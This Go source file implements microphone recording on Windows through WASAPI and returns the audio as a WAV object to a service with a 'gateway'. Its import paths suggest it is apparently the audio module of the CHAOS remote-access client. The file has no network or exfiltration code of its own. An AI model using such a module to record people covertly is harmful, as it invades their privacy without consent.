package audio

import (
	"bytes"
	"context"
	"flag"
	"fmt"
	"io"
	"reflect"

	"os"
	"os/signal"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"github.com/go-ole/go-ole"
	"github.com/justadoll/CHAOS/client/app/gateway"
	"github.com/justadoll/CHAOS/client/app/services"
	"github.com/justadoll/CHAOS/client/app/shared/environment"
	"github.com/moutend/go-wav"
	"github.com/moutend/go-wca/pkg/wca"
)

type AudioService struct {
	Configuration *environment.Configuration
	Gateway       gateway.Gateway
}

func NewAudioService(configuration *environment.Configuration, gateway gateway.Gateway) services.Audio {
	return &AudioService{
		Configuration: configuration,
		Gateway:       gateway,
	}
}

func (d AudioService) Record(raw_seconds string) (*wav.File, error) {
	args_arr := make([]string, 3)
	args_arr[0] = os.Args[0]
	args_arr[1] = raw_seconds

	wav_file, err := Run(args_arr)
	if err != nil {
		return nil, err
	}
	fmt.Println("wav_file type:", reflect.TypeOf(wav_file))
	return wav_file, nil
}

var version = "latest"
var revision = "latest"

type DurationFlag struct {
	Value time.Duration
}

func (f *DurationFlag) Set(value string) (err error) {
	var sec float64

	if sec, err = strconv.ParseFloat(value, 64); err != nil {
		return
	}
	f.Value = time.Duration(sec * float64(time.Second))
	return
}

func (f *DurationFlag) String() string {
	return f.Value.String()
}

type FilenameFlag struct {
	Value string
}

func (f *FilenameFlag) Set(value string) (err error) {
	if !strings.HasSuffix(value, ".wav") {
		err = fmt.Errorf("specify WAVE audio file (*.wav)")
		return
	}
	f.Value = value
	return
}

func (f *FilenameFlag) String() string {
	return f.Value
}

func Run(args []string) (wav_file *wav.File, err error) {
	var durationFlag DurationFlag
	var filenameFlag FilenameFlag
	var versionFlag bool
	// var file []byte

	f := flag.NewFlagSet(args[0], flag.ExitOnError)
	f.Var(&durationFlag, "duration", "Specify recording duration in second")
	f.Var(&durationFlag, "d", "Alias of --duration")
	f.Var(&filenameFlag, "output", "file name")
	f.BoolVar(&versionFlag, "version", false, "Show version")
	f.Parse(args[1:])

	if versionFlag {
		fmt.Printf("%s-%s\n", version, revision)
		return
	}
	filenameFlag.Value = args[2]
	durationFlag.Set(args[1])

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	ctx, cancel := context.WithCancel(context.Background())

	go func() {
		defer cancel()
		select {
		case <-signalChan:
			fmt.Println("Interrupted by SIGINT")
			cancel()
			return
			// exit?
		}
		return
	}()

	if wav_file, err = captureSharedEventDriven(ctx, durationFlag.Value); err != nil {
		return
	}

	fmt.Println("Successfully done")
	return wav_file, err
	/*
		fmt.Println("Audio:", reflect.TypeOf(audio))
		if file, err = wav.Marshal(audio); err != nil {
			return
		}
			if err = ioutil.WriteFile(filenameFlag.Value, file, 0644); err != nil {
				return
			}
	*/
}

func captureSharedEventDriven(ctx context.Context, duration time.Duration) (audio *wav.File, err error) {
	if err = ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED); err != nil {
		return
	}
	defer ole.CoUninitialize()

	var mmde *wca.IMMDeviceEnumerator
	if err = wca.CoCreateInstance(wca.CLSID_MMDeviceEnumerator, 0, wca.CLSCTX_ALL, wca.IID_IMMDeviceEnumerator, &mmde); err != nil {
		return
	}
	defer mmde.Release()

	var mmd *wca.IMMDevice
	if err = mmde.GetDefaultAudioEndpoint(wca.ECapture, wca.EConsole, &mmd); err != nil {
		return
	}
	defer mmd.Release()

	var ps *wca.IPropertyStore
	if err = mmd.OpenPropertyStore(wca.STGM_READ, &ps); err != nil {
		return
	}
	defer ps.Release()

	var pv wca.PROPVARIANT
	if err = ps.GetValue(&wca.PKEY_Device_FriendlyName, &pv); err != nil {
		return
	}
	fmt.Printf("Capturing audio from: %s\n", pv.String())

	var ac *wca.IAudioClient
	if err = mmd.Activate(wca.IID_IAudioClient, wca.CLSCTX_ALL, nil, &ac); err != nil {
		return
	}
	defer ac.Release()

	var wfx *wca.WAVEFORMATEX
	if err = ac.GetMixFormat(&wfx); err != nil {
		return
	}
	defer ole.CoTaskMemFree(uintptr(unsafe.Pointer(wfx)))

	wfx.WFormatTag = 1
	wfx.NBlockAlign = (wfx.WBitsPerSample / 8) * wfx.NChannels
	wfx.NAvgBytesPerSec = wfx.NSamplesPerSec * uint32(wfx.NBlockAlign)
	wfx.CbSize = 0

	if audio, err = wav.New(int(wfx.NSamplesPerSec), int(wfx.WBitsPerSample), int(wfx.NChannels)); err != nil {
		return
	}

	fmt.Println("--------")
	fmt.Printf("Format: PCM %d bit signed integer\n", wfx.WBitsPerSample)
	fmt.Printf("Rate: %d Hz\n", wfx.NSamplesPerSec)
	fmt.Printf("Channels: %d\n", wfx.NChannels)
	fmt.Println("--------")

	var defaultPeriod wca.REFERENCE_TIME
	var minimumPeriod wca.REFERENCE_TIME
	var latency time.Duration
	if err = ac.GetDevicePeriod(&defaultPeriod, &minimumPeriod); err != nil {
		return
	}
	latency = time.Duration(int(defaultPeriod) * 100)

	fmt.Println("Default period: ", defaultPeriod)
	fmt.Println("Minimum period: ", minimumPeriod)
	fmt.Println("Latency: ", latency)

	if err = ac.Initialize(wca.AUDCLNT_SHAREMODE_SHARED, wca.AUDCLNT_STREAMFLAGS_EVENTCALLBACK, defaultPeriod, 0, wfx, nil); err != nil {
		return
	}

	audioReadyEvent := wca.CreateEventExA(0, 0, 0, wca.EVENT_MODIFY_STATE|wca.SYNCHRONIZE)
	defer wca.CloseHandle(audioReadyEvent)

	if err = ac.SetEventHandle(audioReadyEvent); err != nil {
		return
	}

	var bufferFrameSize uint32
	if err = ac.GetBufferSize(&bufferFrameSize); err != nil {
		return
	}
	fmt.Printf("Allocated buffer size: %d\n", bufferFrameSize)

	var acc *wca.IAudioCaptureClient
	if err = ac.GetService(wca.IID_IAudioCaptureClient, &acc); err != nil {
		return
	}
	defer acc.Release()

	if err = ac.Start(); err != nil {
		return
	}
	fmt.Println("Start capturing with shared event driven mode")
	if duration <= 0 {
		fmt.Println("Press Ctrl-C to stop capturing")
	}

	var output = []byte{}
	var offset int
	var isCapturing bool = true
	var currentDuration time.Duration
	var b *byte
	var data *byte
	var availableFrameSize uint32
	var flags uint32
	var devicePosition uint64
	var qcpPosition uint64
	//var padding uint32

	errorChan := make(chan error, 1)

	for {
		if !isCapturing {
			close(errorChan)
			break
		}
		go func() {
			errorChan <- watchEvent(ctx, audioReadyEvent)
		}()

		select {
		case <-ctx.Done():
			isCapturing = false
			<-errorChan
			break
		case err = <-errorChan:
			currentDuration = time.Duration(float64(offset) / float64(wfx.WBitsPerSample/8) / float64(wfx.NChannels) / float64(wfx.NSamplesPerSec) * float64(time.Second))
			if duration != 0 && currentDuration > duration {
				isCapturing = false
				break
			}
			if err != nil {
				isCapturing = false
				break
			}
			if err = acc.GetBuffer(&data, &availableFrameSize, &flags, &devicePosition, &qcpPosition); err != nil {
				continue
			}
			if availableFrameSize == 0 {
				continue
			}

			start := unsafe.Pointer(data)
			lim := int(availableFrameSize) * int(wfx.NBlockAlign)
			buf := make([]byte, lim)

			for n := 0; n < lim; n++ {
				b = (*byte)(unsafe.Pointer(uintptr(start) + uintptr(n)))
				buf[n] = *b
			}

			offset += lim
			output = append(output, buf...)

			if err = acc.ReleaseBuffer(availableFrameSize); err != nil {
				return
			}
		}
	}

	io.Copy(audio, bytes.NewBuffer(output))
	fmt.Println("Stop capturing")

	if err = ac.Stop(); err != nil {
		return
	}
	return
}

func watchEvent(ctx context.Context, event uintptr) (err error) {
	errorChan := make(chan error, 1)
	go func() {
		errorChan <- eventEmitter(event)
	}()
	select {
	case err = <-errorChan:
		close(errorChan)
		return
	case <-ctx.Done():
		err = ctx.Err()
		return
	}
	return
}

func eventEmitter(event uintptr) (err error) {
	dw := wca.WaitForSingleObject(event, wca.INFINITE)
	if dw != 0 {
		return fmt.Errorf("failed to watch event")
	}
	//ole.CoUninitialize()
	return
}
